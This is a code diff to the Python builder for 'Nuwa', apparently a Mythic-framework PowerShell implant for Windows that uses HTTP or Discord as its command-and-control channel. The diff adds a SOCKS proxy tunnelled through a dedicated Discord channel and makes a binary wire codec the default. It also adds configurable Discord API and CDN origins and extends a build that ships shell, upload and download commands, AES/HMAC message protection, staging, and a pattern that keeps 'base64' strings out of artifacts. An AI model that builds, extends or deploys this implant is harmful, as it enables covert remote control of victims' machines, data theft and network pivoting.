@@ -102,6 +102,7 @@ BASE_CODE_ROOT = AGENT_CODE_ROOT / "base"
 CODEC_ROOT = AGENT_CODE_ROOT / "codecs"
 CLM_CODEC_ROOT = CODEC_ROOT / "clm"
 COMMAND_ROOT = AGENT_CODE_ROOT / "commands"
+SOCKS_ROOT = AGENT_CODE_ROOT / "socks"
 PROFILE_ROOT = AGENT_CODE_ROOT / "profiles"
 FRAMING_ROOT = AGENT_CODE_ROOT / "framing"
 DISCORD_PROFILE_ROOT = PROFILE_ROOT / "discordx"
@@ -118,9 +119,7 @@ CLM_PROTECTION_ROOT = PROTECTION_ROOT / "clm"
 CLM_PROTECTION_PROFILE_ROOT = CLM_PROTECTION_ROOT / "profiles"
 STAGING_ROOT = AGENT_CODE_ROOT / "staging"
 DEFAULT_COMMANDS = ["sleep", "cd", "whoami", "hostname", "exit", "ls", "shell", "upload", "download"]
-POWERSHELL_CODEC_PROFILES = tuple(
-    sorted(path.stem for path in CODEC_ROOT.glob("*.ps1") if path.is_file())
-)
+POWERSHELL_CODEC_PROFILES = ("binary-v1",)
 FORBIDDEN_RAW_ARTIFACT_PATTERN = re.compile(
     rb"(?:base64|(?<![0-9a-f])b64(?![0-9a-f]))",
     re.IGNORECASE,
@@ -335,11 +334,7 @@ def _resolve_transport_envelope_selection(
             key=None,
         )
 
-    envelope_format = (
-        str(c2_parameters.get("transport_envelope_format", "json-v1")).strip().lower()
-        if profile == "discordx"
-        else "json-v1"
-    )
+    envelope_format = str(c2_parameters.get("transport_envelope_format", "binary-v1")).strip().lower()
     presentation = str(c2_parameters.get(
         "transport_presentation", "plain" if profile == "discordx" else legacy_presentation
     )).strip().lower()
@@ -362,7 +357,7 @@ def _resolve_transport_envelope_selection(
     allowed_presentations = set(available_presentations)
     if profile == "http":
         allowed_presentations.add(legacy_presentation)
-    if profile == "discordx" and envelope_format not in DISCORD_TRANSPORT_FORMATS:
+    if envelope_format not in DISCORD_TRANSPORT_FORMATS:
         raise ValueError(
             f"transport_envelope_format must be one of {list(DISCORD_TRANSPORT_FORMATS)}"
         )
@@ -393,8 +388,7 @@ def _resolve_transport_envelope_selection(
         envelope_format != "json-v1" or protection != "none"
     ):
         raise ValueError(
-            "plain transport_presentation requires json-v1 transport_envelope_format "
-            "and none transport_protection"
+            "plain transport_presentation requires json-v1 and none protection"
         )
 
     if protection == "none":
@@ -757,6 +751,12 @@ def _payload_compatibility_errors(
     transport_envelope: TransportEnvelopeSelection,
 ) -> list[str]:
     errors: list[str] = []
+    if codec_profile != "binary-v1":
+        errors.append("Nuwa inner v1 requires binary-v1 codec_profile")
+    if framing_mode != "raw":
+        errors.append("Nuwa binary v1 requires use_base64=false")
+    if not transport_envelope.enabled or transport_envelope.envelope_format != "binary-v1":
+        errors.append("Nuwa binary v1 requires a binary-v1 fixed transport envelope")
     if c2_profile_name == "discordx":
         wire_protocol = str(c2_parameters.get("wire_protocol", "fixed") or "").strip().lower()
         if wire_protocol != "fixed":
@@ -769,19 +769,50 @@ def _payload_compatibility_errors(
             "encrypted_exchange_check can be enabled only with the "
             "nuwa_aes256_hmac_v1 protection profile and one matching 32-byte key"
         )
-    if protection_profile != PROTECTION_NONE and codec_profile == "raw":
-        if c2_profile_name == "http":
-            errors.append(
-                "Raw codec_profile cannot carry binary inner-protection output over HTTP; "
-                "select base64, decimal, or emoji"
-            )
-        elif transport_envelope.envelope_format == "json-v1" and framing_mode == "raw":
-            errors.append(
-                "json-v1 transport_envelope_format cannot carry protected raw codec bytes "
-                "with use_base64=false; select binary-v1, historical Base64 framing, "
-                "or a text-producing codec_profile"
-            )
     return errors
+
+
+def _socks_build_errors(
+    *, c2_profile_name: str, c2_parameters: Mapping[str, Any],
+    powershell_runtime: str, command_names: Sequence[str],
+) -> list[str]:
+    if "socks" not in command_names:
+        return []
+    errors: list[str] = []
+    if c2_profile_name != "discordx":
+        errors.append("Nuwa SOCKS requires DiscordX C2")
+    if powershell_runtime != POWERSHELL_RUNTIME_FULL:
+        errors.append("Nuwa SOCKS requires FullLanguage PowerShell; CLM TCP proof failed")
+    channel = str(c2_parameters.get("socks_channel", "") or "").strip()
+    normal_channel = str(c2_parameters.get("bot_channel", "") or "").strip()
+    if not channel:
+        errors.append("socks_channel is required when socks is selected")
+    elif not channel.isdigit():
+        errors.append("socks_channel must be a numeric Discord channel ID")
+    elif channel == normal_channel:
+        errors.append("socks_channel must be different from bot_channel")
+    return errors
+
+
+def _validate_socks_build(**kwargs: Any) -> bool:
+    errors = _socks_build_errors(**kwargs)
+    if errors:
+        raise InvalidPayloadOptions(errors)
+    return "socks" in kwargs["command_names"]
+
+
+def _render_socks_agent_main_source(source: str, *, selected: bool) -> str:
+    if not selected:
+        return source
+    return _replace_source_once(
+        source,
+        "            default {\n                throw (\"Unsupported command '{0}'\" -f $commandName)\n            }",
+        "            'socks' {\n"
+        "                $response.user_output = Invoke-NuwaSocks -Parameters $parameters\n"
+        "            }\n"
+        "            default {\n                throw (\"Unsupported command '{0}'\" -f $commandName)\n            }",
+        label="selected SOCKS command dispatch",
+    )
 
 
 def _validate_payload_compatibility(**kwargs: Any) -> None:
@@ -832,6 +863,11 @@ def _resolve_payload_options(
     runtime = capture(lambda: _coerce_powershell_runtime(powershell_runtime))
     commands, command_errors = _resolve_command_names(command_names)
     errors.extend(command_errors)
+    if profile_name is not None and runtime is not None:
+        errors.extend(_socks_build_errors(
+            c2_profile_name=profile_name, c2_parameters=parameters,
+            powershell_runtime=runtime, command_names=commands,
+        ))
 
     protection = capture(
         lambda: _resolve_protection_selection(parameters.get("AESPSK"))
@@ -958,21 +994,7 @@ def _render_protected_agent_main_source() -> str:
 
 
 def _render_discord_byte_agent_main_source(source: str) -> str:
-    source = _replace_source_once(
-        source,
-        "    $wireBody = ConvertFrom-NuwaUtf8Bytes -Bytes (\n"
-        "        ConvertTo-NuwaWireBytes -MessageJson $json -Context (Get-NuwaCodecContext -Direction 'outbound' -Uuid $Uuid -MessageType $Action)\n"
-        "    )",
-        "    [byte[]]$wireBody = ConvertTo-NuwaWireBytes -MessageJson $json -Context "
-        "(Get-NuwaCodecContext -Direction 'outbound' -Uuid $Uuid -MessageType $Action)",
-        label="Discord byte-oriented wire body",
-    )
-    return _replace_source_once(
-        source,
-        "    if ([string]::IsNullOrWhiteSpace($rawResponse)) {",
-        "    if ($null -eq $rawResponse -or ([byte[]]$rawResponse).Length -eq 0) {",
-        label="Discord byte-oriented empty response check",
-    )
+    return source
 
 
 def _render_staged_agent_runtime_source() -> str:
@@ -1100,6 +1122,53 @@ def _render_static_codec_dispatch_source(
     *,
     protected: bool = False,
 ) -> str:
+    if codec_profile == "binary-v1":
+        encode_protection = (
+            "[byte[]](Protect-NuwaBytes -Bytes $binary -Context $Context)"
+            if protected else "$binary"
+        )
+        decode_protection = (
+            "[byte[]](Unprotect-NuwaBytes -Bytes $WireBytes -Context $Context)"
+            if protected else "$WireBytes"
+        )
+        source = r'''
+function ConvertTo-NuwaWireBytes {
+    [CmdletBinding()]
+    param([hashtable]$Message, [string]$MessageJson, [Parameter(Mandatory = $true)][hashtable]$Context)
+    if ($null -ne $Message) {
+        $message = $Message
+    } else {
+        $parsed = $MessageJson | ConvertFrom-Json -ErrorAction Stop
+        if ($null -eq $parsed -or -not $MessageJson.TrimStart().StartsWith('{')) { throw 'Nuwa message must be a map' }
+        $message = @{}
+        foreach ($property in $parsed.PSObject.Properties) { $message[$property.Name] = $property.Value }
+    }
+    foreach ($response in @($message.responses)) {
+        if ($null -eq $response) { continue }
+        if (($response -is [System.Collections.IDictionary] -and $response.Contains('chunk_data')) -or
+            $null -ne $response.PSObject.Properties['chunk_data']) {
+            $response.chunk_data = [byte[]]@($response.chunk_data)
+        }
+        if ($null -ne $response.download -and
+            (($response.download -is [System.Collections.IDictionary] -and $response.download.Contains('chunk_data')) -or
+             $null -ne $response.download.PSObject.Properties['chunk_data'])) {
+            $response.download.chunk_data = [byte[]]@($response.download.chunk_data)
+        }
+    }
+    $binary = [byte[]](ConvertTo-NuwaBinaryV1Bytes -Message $message)
+    return ,([byte[]](__ENCODE_PROTECTION__))
+}
+
+function ConvertFrom-NuwaWireBytes {
+    [CmdletBinding()]
+    param([Parameter(Mandatory = $true)][byte[]]$WireBytes, [Parameter(Mandatory = $true)][hashtable]$Context)
+    $binary = __DECODE_PROTECTION__
+    $message = ConvertFrom-NuwaBinaryV1Bytes -Bytes ([byte[]]$binary)
+    return ($message | ConvertTo-Json -Compress -Depth 20)
+}
+'''
+        return (source.replace("__ENCODE_PROTECTION__", encode_protection)
+                      .replace("__DECODE_PROTECTION__", decode_protection).strip() + "\n")
     function_names = {
         "raw": ("ConvertTo-NuwaRawBytes", "ConvertFrom-NuwaRawBytes"),
         "base64": ("ConvertTo-NuwaRadix64Bytes", "ConvertFrom-NuwaRadix64Bytes"),
@@ -1154,6 +1223,11 @@ function ConvertFrom-NuwaWireBytes {{
 
 def _codec_source_path(codec_profile: str, powershell_runtime: str) -> pathlib.Path:
     runtime = _coerce_powershell_runtime(powershell_runtime)
+    if codec_profile == "binary-v1":
+        return BASE_CODE_ROOT / (
+            "binary_v1_clm.ps1" if runtime == POWERSHELL_RUNTIME_CONSTRAINED
+            else "binary_v1.ps1"
+        )
     if codec_profile == "base64" and runtime == POWERSHELL_RUNTIME_CONSTRAINED:
         return CLM_CODEC_ROOT / "base64.ps1"
     return CODEC_ROOT / f"{codec_profile}.ps1"
@@ -1198,6 +1272,20 @@ def _profile_config(c2_profile_name: str, c2_parameters: dict[str, Any]) -> dict
         return {
             "DiscordToken": str(c2_parameters.get("discord_token", "")),
             "BotChannel": str(c2_parameters.get("bot_channel", "")),
+            "DiscordApiOrigin": str(
+                c2_parameters.get("provider_api_origin", "https://discord.com")
+            ).rstrip("/"),
+            "DiscordGatewayOrigin": str(
+                c2_parameters.get("provider_gateway_origin", "")
+            ).rstrip("/"),
+            "DiscordCdnOrigin": str(
+                c2_parameters.get("provider_cdn_origin", "https://cdn.discordapp.com")
+            ).rstrip("/"),
+            "DiscordApiVersion": int(c2_parameters.get("discord_api_version", 10)),
+            "DiscordProviderKind": str(
+                c2_parameters.get("discord_provider_kind", "discord")
+            ),
+            "DiscordListenerId": str(c2_parameters.get("listener_id", "")),
             "MessageChecks": int(c2_parameters.get("message_checks", 10)),
             "TimeBetweenChecks": int(c2_parameters.get("time_between_checks", 10)),
         }
@@ -1214,13 +1302,10 @@ def _transport_envelope_source_paths(
         return ()
     runtime = _coerce_powershell_runtime(powershell_runtime)
     paths: list[pathlib.Path] = [
-        TRANSPORT_ENVELOPE_ROOT / (
-            "discord_functions.ps1" if c2_profile_name == "discordx" else "functions.ps1"
-        )
+        TRANSPORT_ENVELOPE_ROOT / "discord_functions.ps1"
     ]
-    if c2_profile_name == "discordx":
-        paths.append(TRANSPORT_ENVELOPE_FORMAT_ROOT / f"{selection.envelope_format}.ps1")
-        paths.append(TRANSPORT_ENVELOPE_FRAMING_ROOT / f"{framing_mode}.ps1")
+    paths.append(TRANSPORT_ENVELOPE_FORMAT_ROOT / f"{selection.envelope_format}.ps1")
+    paths.append(TRANSPORT_ENVELOPE_FRAMING_ROOT / f"{framing_mode}.ps1")
 
     if selection.protection != "none":
         if selection.key_mode == "directional":
@@ -1392,6 +1477,10 @@ def render_payload_source(
     if codec_profile not in POWERSHELL_CODEC_PROFILES:
         raise ValueError(f"Unsupported codec profile '{codec_profile}'")
     powershell_runtime = _coerce_powershell_runtime(powershell_runtime)
+    socks_selected = _validate_socks_build(
+        c2_profile_name=c2_profile_name, c2_parameters=c2_parameters,
+        powershell_runtime=powershell_runtime, command_names=command_names,
+    )
     transport_envelope = _resolve_transport_envelope_selection(
         c2_profile_name,
         c2_parameters,
@@ -1418,6 +1507,8 @@ def render_payload_source(
         framing_mode=framing_mode,
     )
     config.update(_profile_config(c2_profile_name, c2_parameters))
+    if socks_selected:
+        config["SocksChannel"] = str(c2_parameters["socks_channel"]).strip()
     config["PowerShellRuntime"] = powershell_runtime
     _apply_transport_envelope_config(config, transport_envelope)
     if transport_envelope.enabled:
@@ -1471,6 +1562,9 @@ def render_payload_source(
         )
     sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope))
 
+    if socks_selected:
+        sections.extend(_read_text(path) for path in sorted(SOCKS_ROOT.glob("*.ps1")))
+
     selected_commands = list(dict.fromkeys(command_names or DEFAULT_COMMANDS))
     for dependency in ("hostname", "whoami"):
         if dependency not in selected_commands:
@@ -1481,6 +1575,7 @@ def render_payload_source(
             sections.append(_read_text(command_path))
 
     agent_main_source = _read_text(BASE_CODE_ROOT / "agent_main.ps1")
+    agent_main_source = _render_socks_agent_main_source(agent_main_source, selected=socks_selected)
     if c2_profile_name == "discordx" and transport_envelope.enabled:
         agent_main_source = _render_discord_byte_agent_main_source(agent_main_source)
     sections.append(agent_main_source)
@@ -1518,6 +1613,10 @@ def render_protected_payload_source(
     if protection_profile not in PROTECTED_PROFILES:
         raise ValueError(f"Unsupported protected profile '{protection_profile}'")
     powershell_runtime = _coerce_powershell_runtime(powershell_runtime)
+    socks_selected = _validate_socks_build(
+        c2_profile_name=c2_profile_name, c2_parameters=c2_parameters,
+        powershell_runtime=powershell_runtime, command_names=command_names,
+    )
     if not isinstance(protection_key, bytes) or len(protection_key) != 32:
         raise ValueError("Protected payload rendering requires one 32-byte key")
     if not isinstance(staging_enabled, bool):
@@ -1549,6 +1648,8 @@ def render_protected_payload_source(
         framing_mode=framing_mode,
     )
     config.update(_profile_config(c2_profile_name, c2_parameters))
+    if socks_selected:
+        config["SocksChannel"] = str(c2_parameters["socks_channel"]).strip()
     config["PowerShellRuntime"] = powershell_runtime
     _apply_transport_envelope_config(config, transport_envelope)
     if transport_envelope.enabled:
@@ -1614,6 +1715,9 @@ def render_protected_payload_source(
         )
     sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope))
 
+    if socks_selected:
+        sections.extend(_read_text(path) for path in sorted(SOCKS_ROOT.glob("*.ps1")))
+
     selected_commands = list(dict.fromkeys(command_names or DEFAULT_COMMANDS))
     for dependency in ("hostname", "whoami"):
         if dependency not in selected_commands:
@@ -1627,6 +1731,7 @@ def render_protected_payload_source(
     if staging_enabled:
         staging_module = _read_text(_staging_source_path(powershell_runtime))
         staged_runtime = _render_staged_agent_runtime_source()
+        staged_runtime = _render_socks_agent_main_source(staged_runtime, selected=socks_selected)
         staged_main = _read_text(STAGING_ROOT / "agent_main.ps1")
         if c2_profile_name == "discordx" and transport_envelope.enabled:
             staged_runtime = _render_discord_byte_agent_main_source(staged_runtime)
@@ -1639,6 +1744,7 @@ def render_protected_payload_source(
         )
     else:
         agent_main_source = _render_protected_agent_main_source()
+        agent_main_source = _render_socks_agent_main_source(agent_main_source, selected=socks_selected)
         if c2_profile_name == "discordx" and transport_envelope.enabled:
             agent_main_source = _render_discord_byte_agent_main_source(agent_main_source)
         sections.append(agent_main_source)
@@ -1666,7 +1772,10 @@ class Nuwa(PayloadType):
     supported_os = [SupportedOS.Windows]
     wrapper = False
     wrapped_payloads: list[str] = []
-    supports_dynamic_loading = False
+    # Mythic honors the operator's build-time command selection only when this
+    # flag is true. Nuwa still bundles selected scripts statically and offers
+    # no runtime load command.
+    supports_dynamic_loading = True
     mythic_encrypts = False
     translation_container = "nuwa_translation"
     c2_profiles = ["http", "discordx"]
@@ -1708,13 +1817,11 @@ class Nuwa(PayloadType):
             name="codec_profile",
             parameter_type=BuildParameterType.ChooseOne,
             choices=list(POWERSHELL_CODEC_PROFILES),
-            default_value="raw",
+            default_value="binary-v1",
             description=(
-                "Inner message representation. Keep raw (recommended) for compact "
-                "UTF-8 JSON. With AESPSK protection, HTTP requires base64, decimal, "
-                "or emoji; DiscordX json-v1 also requires one when use_base64=false, "
-                "while binary-v1 can carry protected raw bytes. Outer transport "
-                "presentation is separate."
+                "Nuwa inner v1 is a canonical binary map with raw file and SOCKS bytes. "
+                "The fixed outer envelope and its presentation are selected separately "
+                "on the C2 profile."
             ),
         ),
         BuildParameter(
